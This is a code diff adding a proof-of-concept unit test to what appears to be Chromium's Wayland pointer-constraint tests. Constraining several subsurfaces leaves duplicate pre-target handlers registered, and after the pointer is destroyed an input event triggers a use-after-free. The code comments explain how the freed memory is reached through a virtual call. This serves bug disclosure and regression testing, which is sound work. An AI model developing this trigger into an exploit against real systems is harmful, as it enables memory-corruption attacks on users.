@@ -1747,6 +1747,62 @@ TEST_F(PointerConstraintTest, MultipleSurfacesCanBeConstrained) {
   pointer_.reset();
 }
 
+// POC: Demonstrates a use-after-free in aura::Env::pre_target_list_.
+//
+// EnablePointerCapture() unconditionally registers |this| as a pre-target
+// handler on the global aura::Env every time ConstrainPointer() succeeds for a
+// distinct Surface*. When N subsurfaces of the same active toplevel are
+// constrained back-to-back (no focus change), the handler is added N times.
+// ~Pointer() removes only one entry, leaving N-1 dangling RAW_PTR_EXCLUSION
+// EventHandler* in aura::Env. The next input event dereferences freed memory.
+TEST_F(PointerConstraintTest, UAFViaDuplicatePreTargetHandlerOnSubsurfaces) {
+  constexpr int kNumSubSurfaces = 3;
+
+  // Subsurfaces of the active toplevel: each has a distinct Surface*, inherits
+  // the parent's SecurityDelegate (so CanLockPointer() passes), and its window
+  // is a descendant of the active toplevel (so the Contains() check passes).
+  std::vector<std::unique_ptr<Surface>> sub_surfaces;
+  std::vector<std::unique_ptr<SubSurface>> sub_roles;
+  std::vector<std::unique_ptr<testing::NiceMock<MockPointerConstraintDelegate>>>
+      sub_constraints;
+  for (int i = 0; i < kNumSubSurfaces; ++i) {
+    sub_surfaces.push_back(std::make_unique<Surface>());
+    sub_roles.push_back(
+        std::make_unique<SubSurface>(sub_surfaces.back().get(), surface_));
+    sub_constraints.push_back(
+        std::make_unique<testing::NiceMock<MockPointerConstraintDelegate>>());
+    Surface* sub = sub_surfaces.back().get();
+    ON_CALL(*sub_constraints.back(), GetConstrainedSurface())
+        .WillByDefault(testing::Return(sub));
+    ON_CALL(*sub_constraints.back(), IsPersistent())
+        .WillByDefault(testing::Return(true));
+    EXPECT_CALL(delegate_, CanAcceptPointerEventsForSurface(sub))
+        .WillRepeatedly(testing::Return(true));
+  }
+
+  // Each call adds a duplicate kSystem pre-target handler on aura::Env because
+  // EnablePointerCapture() does not check whether capture is already active.
+  for (auto& c : sub_constraints) {
+    EXPECT_TRUE(pointer_->ConstrainPointer(c.get()));
+  }
+
+  // wl_pointer.release: ~Pointer() removes exactly ONE pre-target handler from
+  // aura::Env, leaving kNumSubSurfaces-1 dangling raw EventHandler* entries.
+  EXPECT_CALL(delegate_, OnPointerDestroying(pointer_.get()));
+  pointer_->UnconstrainPointerByUserAction();
+  pointer_.reset();
+
+  // Any subsequent input event in ash walks the pre-target chain up to
+  // aura::Env, copies the dangling pointers, then writes to
+  // handler->dispatchers_ and performs a virtual call handler->OnEvent() on
+  // freed memory. Under ASAN this reports heap-use-after-free.
+  generator_->MoveMouseTo(gfx::Point(50, 50));
+
+  // Cleanup (only reached without ASAN).
+  sub_roles.clear();
+  sub_surfaces.clear();
+}
+
 TEST_F(PointerConstraintTest, UserActionPreventsConstraint) {
   ON_CALL(constraint_delegate_, IsPersistent())
       .WillByDefault(testing::Return(false));
